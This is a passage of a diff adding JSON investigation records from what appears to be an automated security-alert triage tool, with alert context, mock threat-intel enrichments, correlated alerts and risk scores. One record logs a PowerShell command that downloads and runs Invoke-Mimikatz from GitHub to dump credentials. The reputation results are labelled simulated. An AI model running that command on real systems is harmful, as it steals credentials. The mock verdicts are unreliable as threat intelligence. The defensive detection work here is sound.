@@ -1,0 +1,1383 @@
+[
+  {
+    "_id": "00fc4ac5-7945-43ff-b9f4-97fe8f7f35ae",
+    "alert_id": "43eb4a6c932bcdb9dd65bbbf8b621e95",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-08-12T07:42:49.723Z"
+    },
+    "started_at": {
+      "$date": "2026-08-12T07:42:49.767Z"
+    },
+    "completed_at": {
+      "$date": "2026-08-12T07:42:49.865Z"
+    },
+    "context": {
+      "subject_user": "ayush",
+      "target_user": "administrator"
+    },
+    "enrichments": [],
+    "logs": [
+      "Investigation started for alert 43eb4a6c932bcdb9dd65bbbf8b621e95",
+      "Context extraction complete: found 2 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious."
+    ]
+  },
+  {
+    "_id": "4ae2c4e5-57eb-437f-bbbc-5560d179de3e",
+    "alert_id": "337f4534258aca17a22c512e00e378e6",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-08-12T15:17:24.755Z"
+    },
+    "started_at": {
+      "$date": "2026-08-12T15:17:24.806Z"
+    },
+    "completed_at": {
+      "$date": "2026-08-12T15:17:24.851Z"
+    },
+    "context": {
+      "registry_key": "HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleChromeAutoLaunch_8BB3020C2CA1733EBB223E6A127FF2D8"
+    },
+    "enrichments": [],
+    "logs": [
+      "Investigation started for alert 337f4534258aca17a22c512e00e378e6",
+      "Context extraction complete: found 1 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious."
+    ]
+  },
+  {
+    "_id": "57fd24fa-f043-452e-8f2a-1f471a5462d9",
+    "alert_id": "f3f61e6c940264b637ba1fd20817ab0e",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-08-12T15:19:56.155Z"
+    },
+    "started_at": {
+      "$date": "2026-08-12T15:19:56.162Z"
+    },
+    "completed_at": {
+      "$date": "2026-08-12T15:19:56.187Z"
+    },
+    "context": {
+      "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "\"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -File D:\\SplunkData\\generate_events.ps1"
+    },
+    "enrichments": [],
+    "logs": [
+      "Investigation started for alert f3f61e6c940264b637ba1fd20817ab0e",
+      "Context extraction complete: found 2 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious."
+    ]
+  },
+  {
+    "_id": "befc4cef-fbbe-465b-8c27-0471b3bba2cf",
+    "alert_id": "0bd218f3acf6552cae392d46fd9166ea",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-08-12T15:45:13.363Z"
+    },
+    "started_at": {
+      "$date": "2026-08-12T15:45:13.383Z"
+    },
+    "completed_at": {
+      "$date": "2026-08-12T15:45:14.476Z"
+    },
+    "context": {
+      "dest_ip": "47.254.24.21",
+      "dest_port": "8106"
+    },
+    "enrichments": [
+      {
+        "ioc": "47.254.24.21",
+        "ioc_type": "ip",
+        "reputation": "benign",
+        "threat_score": 0,
+        "source": "VirusTotal",
+        "raw_response": {
+          "malicious": 0,
+          "suspicious": 0,
+          "undetected": 38,
+          "harmless": 53,
+          "timeout": 0
+        },
+        "cached": false
+      }
+    ],
+    "logs": [
+      "Investigation started for alert 0bd218f3acf6552cae392d46fd9166ea",
+      "Context extraction complete: found 2 key properties and 1 IOCs",
+      "IOC Enrichment complete: 1 IOCs checked. 0 malicious, 0 suspicious."
+    ]
+  },
+  {
+    "_id": "17ae9529-0cd7-4d27-a9a9-e63dde7cae66",
+    "alert_id": "4e7325fc1c5f2a3f9f1d4cefe9204eef",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-08-12T15:45:27.625Z"
+    },
+    "started_at": {
+      "$date": "2026-08-12T15:45:27.631Z"
+    },
+    "completed_at": {
+      "$date": "2026-08-12T15:45:27.643Z"
+    },
+    "context": {
+      "script_block": "function Invoke-SetupAtomicRunner {\r\n\r\n    [CmdletBinding(\r\n        SupportsShouldProcess = $true,\r\n        PositionalBinding = $false,\r\n        ConfirmImpact = 'Medium')]\r\n    Param(\r\n        [Parameter(Mandatory = $false)]\r\n        [switch]\r\n        $SkipServiceSetup,\r\n\r\n        [Parameter(Mandatory = $false)]\r\n        [switch]\r\n        $asScheduledtask\r\n    )\r\n\r\n    # ensure running with admin privs\r\n    if ($artConfig.OS -eq \"windows\") {\r\n        # auto-elevate on Windows\r\n        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())\r\n        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\r\n        if ($testadmin -eq $false) {\r\n            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file \"{0}\" -elevated' -f ($myinvocation.MyCommand.Definition))\r\n            exit $LASTEXITCODE\r\n        }\r\n    }\r\n    else {\r\n        # linux and macos check - doesn't auto-elevate\r\n        if ((id -u) -ne 0 ) {\r\n            Throw \"You must run the Invoke-SetupAtomicRunner script as root\"\r\n            exit\r\n        }\r\n    }\r\n\r\n    if ($artConfig.basehostname.length -gt 15) { Throw \"The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer.\" }\r\n\r\n    #create AtomicRunner-Logs directories if they don't exist\r\n    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore\r\n    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore\r\n\r\n    if ($artConfig.OS -eq \"windows\") {\r\n        if ($asScheduledtask) {\r\n            if (Test-Path $artConfig.credFile) {\r\n                Write-Host \"Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.\"\r\n                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)\r\n            }\r\n   ..."
+    },
+    "enrichments": [],
+    "logs": [
+      "Investigation started for alert 4e7325fc1c5f2a3f9f1d4cefe9204eef",
+      "Context extraction complete: found 1 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious."
+    ]
+  },
+  {
+    "_id": "057773c8-e83e-4603-9067-3dc7a07b001f",
+    "alert_id": "707594f53ef08f810fe975d31e65bbe5",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-09-29T04:26:40.037Z"
+    },
+    "started_at": {
+      "$date": "2026-09-29T04:26:40.057Z"
+    },
+    "completed_at": {
+      "$date": "2026-09-29T04:26:40.085Z"
+    },
+    "context": {
+      "registry_key": "HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HPSEU_Host_Launcher"
+    },
+    "enrichments": [],
+    "logs": [
+      "Investigation started for alert 707594f53ef08f810fe975d31e65bbe5",
+      "Context extraction complete: found 1 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious."
+    ]
+  },
+  {
+    "_id": "f369ac54-ec0a-4bbb-892e-1151b51ec160",
+    "alert_id": "707594f53ef08f810fe975d31e65bbe5",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-09-29T05:00:27.381Z"
+    },
+    "started_at": {
+      "$date": "2026-09-29T05:00:27.389Z"
+    },
+    "completed_at": {
+      "$date": "2026-09-29T05:00:27.416Z"
+    },
+    "context": {
+      "registry_key": "HKU\\S-1-5-21-4283746528-2832981674-120407787-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HPSEU_Host_Launcher"
+    },
+    "enrichments": [],
+    "logs": [
+      "Investigation started for alert 707594f53ef08f810fe975d31e65bbe5",
+      "Context extraction complete: found 1 key properties and 0 IOCs",
+      "IOC Enrichment complete: 0 IOCs checked. 0 malicious, 0 suspicious.",
+      "Decision layer complete: medium priority, risk 58/100"
+    ],
+    "mitre_mappings": [
+      {
+        "technique": "T1547.001",
+        "tactic": "Persistence"
+      }
+    ],
+    "recommendation": "Confirm the detection context and close as benign only when the evidence supports it.",
+    "risk_assessment": {
+      "risk_score": 58,
+      "priority": "medium",
+      "confidence_score": 55
+    },
+    "timeline": [
+      {
+        "timestamp": {
+          "$date": "2026-08-13T04:09:04.105Z"
+        },
+        "event_type": "Registry Persistence",
+        "description": "[HIGH] Registry Persistence \u2013 HPSEU_Host_Launcher on Ayush",
+        "source": "splunk"
+      }
+    ]
+  },
+  {
+    "_id": "419403cd-45e9-496b-bbd1-d64103605e71",
+    "alert_id": "e65e02930d69a6a5cec9ae5b5d5a1b28",
+    "org_id": "default",
+    "status": "complete",
+    "created_at": {
+      "$date": "2026-09-29T06:00:32.161Z"
+    },
+    "started_at": {
+      "$date": "2026-09-29T06:00:32.164Z"
+    },
+    "completed_at": {
+      "$date": "2026-09-29T06:00:32.207Z"
+    },
+    "context": {
+      "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\" ",
+      "parent_process": "C:\\Windows\\System32\\cmd.exe",
+      "hashes": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+      "user": "ATTACKRANGE\\Administrator"
+    },
+    "correlations": [
+      {
+        "alert_id": "f3f61e6c940264b637ba1fd20817ab0e",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-08-11T06:37:25.890Z"
+        },
+        "matches": [
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          }
+        ]
+      },
+      {
+        "alert_id": "f3bf4403d01fe44e658d0862a5867dd2",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:03.223Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "d994abf978a879347a1d4b55b04600fc",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:02.680Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "6bd2c1e77e212f75dbbdf30bbba2c823",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:02.197Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "b691539abb0b6a291957552ed2bbcae3",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:01.858Z"
+        },
+        "matches": [
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "0dc7adbd7de92d1f3c2dcf6bbe3fd761",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:01.271Z"
+        },
+        "matches": [
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "6c163bfa8625edb4ee97f1a5ba5cfcbf",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:00.756Z"
+        },
+        "matches": [
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "f086e362afba9446fea1ad617e37eb45",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:08:00.261Z"
+        },
+        "matches": [
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "16633a3e1eca71ea42956b198381495e",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:07:59.711Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "cec5d6bd9246bac8588fb52b8a882a6a",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:07:51.257Z"
+        },
+        "matches": [
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "0fa2fe13bb4f1b0ca5a1d9f0a65e97e6",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:07:47.404Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "f04dbe61cd4c4b40f132c98f9e0ebf7a",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T14:07:45.449Z"
+        },
+        "matches": [
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "ec005d5b784bea3934e3953c15a6dbf7",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 pastebin.com on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T13:50:51.052Z"
+        },
+        "matches": [
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          }
+        ]
+      },
+      {
+        "alert_id": "aada32b2177b8adb3c63730cf44f765d",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 bit.ly on win-dc-228.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-04T13:50:50.953Z"
+        },
+        "matches": [
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          }
+        ]
+      },
+      {
+        "alert_id": "e0840c73e63c9b71d35a86120c2237d5",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-03T15:27:48.056Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          }
+        ]
+      },
+      {
+        "alert_id": "e73dccf4ad321b07875b11af0054c149",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-228.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-03T15:27:47.819Z"
+        },
+        "matches": [
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          }
+        ]
+      },
+      {
+        "alert_id": "6c92c56e96b14acc4ba352bb822dccfa",
+        "title": "[MEDIUM] Suspicious Network Connection \u2013 0:0:0:0:0:0:0:1:389 from win-dc-974.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:58:41.031Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          }
+        ]
+      },
+      {
+        "alert_id": "ff9a91cfeda4edf928c49209bffa8838",
+        "title": "[MEDIUM] Suspicious Network Connection \u2013 0:0:0:0:0:0:0:1:389 from win-dc-974.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:57:41.001Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          }
+        ]
+      },
+      {
+        "alert_id": "7d871bf7a4cdc3b5b357edd65d085eb8",
+        "title": "[MEDIUM] Suspicious Network Connection \u2013 0:0:0:0:0:0:0:1:389 from win-dc-974.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:40.987Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          }
+        ]
+      },
+      {
+        "alert_id": "bcae6af9b773ab9a93744b3ce90b7efb",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-974.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:29.404Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          },
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "98bda7784234e44f9a60421139f39111",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-974.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:28.609Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          },
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "4e50bacc7d5389ddf5137655bd8242dd",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-974.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:27.934Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          },
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "9e2fc5cb1fea12716181f675391808e6",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-974.attackrange.local",
+        "severity": "critical",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:25.612Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          },
+          {
+            "type": "user",
+            "value": "ATTACKRANGE\\Administrator"
+          },
+          {
+            "type": "process_name",
+            "value": "powershell.exe"
+          },
+          {
+            "type": "ioc",
+            "value": "097CE5761C89434367598B34FE32893B"
+          },
+          {
+            "type": "ioc",
+            "value": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+          },
+          {
+            "type": "ioc",
+            "value": "CAEE994F79D85E47C06E5FA9CDEAE453"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "099ed4f1a95d32eccaace92e6c7dedc6",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-974.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:21.571Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      },
+      {
+        "alert_id": "a81c6a252855c36fd18267e60214ae4a",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on win-dc-974.attackrange.local",
+        "severity": "medium",
+        "status": "New",
+        "created_at": {
+          "$date": "2021-03-02T16:56:20.846Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "win-dc-974.attackrange.local"
+          },
+          {
+            "type": "ioc",
+            "value": "raw.githubusercontent.com"
+          }
+        ]
+      }
+    ],
+    "enrichments": [
+      {
+        "ioc": "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436",
+        "ioc_type": "hash",
+        "reputation": "benign",
+        "threat_score": 0,
+        "source": "VirusTotal (Mock)",
+        "raw_response": {
+          "mock_reason": "Simulated benign result"
+        },
+        "cached": false
+      },
+      {
+        "ioc": "raw.githubusercontent.com",
+        "ioc_type": "domain",
+        "reputation": "malicious",
+        "threat_score": 95,
+        "source": "VirusTotal (Mock)",
+        "raw_response": {
+          "mock_reason": "Simulated malicious result"
+        },
+        "cached": false
+      },
+      {
+        "ioc": "097CE5761C89434367598B34FE32893B",
+        "ioc_type": "hash",
+        "reputation": "benign",
+        "threat_score": 0,
+        "source": "VirusTotal (Mock)",
+        "raw_response": {
+          "mock_reason": "Simulated benign result"
+        },
+        "cached": false
+      },
+      {
+        "ioc": "CAEE994F79D85E47C06E5FA9CDEAE453",
+        "ioc_type": "hash",
+        "reputation": "benign",
+        "threat_score": 0,
+        "source": "VirusTotal (Mock)",
+        "raw_response": {
+          "mock_reason": "Simulated benign result"
+        },
+        "cached": false
+      }
+    ],
+    "evidence": {
+      "ioc_count": 4,
+      "enrichment_count": 4,
+      "correlated_alert_count": 25,
+      "mitre_count": 1
+    },
+    "logs": [
+      "Investigation started for alert e65e02930d69a6a5cec9ae5b5d5a1b28",
+      "Context extraction complete: found 5 key properties and 4 IOCs",
+      "IOC Enrichment complete: 4 IOCs checked. 1 malicious, 0 suspicious.",
+      "Decision layer complete: critical priority, risk 90/100"
+    ],
+    "mitre_mappings": [
+      {
+        "technique": "T1059.001",
+        "tactic": "Execution"
+      }
+    ],
+    "recommendation": "Contain the affected host and validate the malicious IOC before closing the alert.",
+    "risk_assessment": {
+      "risk_score": 90,
+      "priority": "critical",
+      "confidence_score": 75
+    },
+    "timeline": [
+      {
+        "timestamp": {
+          "$date": "2021-03-01T22:53:21.495Z"
+        },
+        "event_type": "Malicious PowerShell",
+        "description": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on win-dc-974.attackrange.local",
+        "source": "attack_data"
+      }
+    ]
+  },
+  {
+    "_id": "30ae3ac8a2064bd8b6b56123f0b6d46a",
+    "alert_id": "fcafefe2cc181e8a44365fb4a5f35214",
+    "status": "complete",
+    "started_at": {
+      "$date": "2026-09-29T07:13:50.278Z"
+    },
+    "completed_at": {
+      "$date": "2026-09-29T07:13:50.308Z"
+    },
+    "context": {
+      "subject_user": "AYUSH$",
+      "target_user": "Splunkd"
+    },
+    "correlations": [
+      {
+        "alert_id": "ae412feb73b9539d1120275a3132a8e2",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 Splunkd",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T07:05:31.568Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "eb86e2961863dabc28648b733204cca4",
+        "title": "[HIGH] Lateral Movement \u2013 AYUSH$ \u2192 Splunkd",
+        "severity": "high",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T06:51:03.946Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          },
+          {
+            "type": "user",
+            "value": "AYUSH$"
+          }
+        ]
+      },
+      {
+        "alert_id": "084350d0650c3b54400bd77788e4c113",
+        "title": "[MEDIUM] DNS Tunneling / Suspicious DNS \u2013 raw.githubusercontent.com on Ayush",
+        "severity": "medium",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T06:40:11.859Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "7bff3e8dcf0597cb3e19ba2c99214c6b",
+        "title": "[CRITICAL] Malicious PowerShell \u2013 powershell.exe on Ayush",
+        "severity": "critical",
+        "status": "Investigated",
+        "created_at": {
+          "$date": "2026-09-29T06:01:25.923Z"
+        },
+        "matches": [
+          {
+            "type": "host",
+            "value": "Ayush"
+          }
+        ]
+      },
+      {
+        "alert_id": "9fe18e9d77b87042d51056393d7543f4",
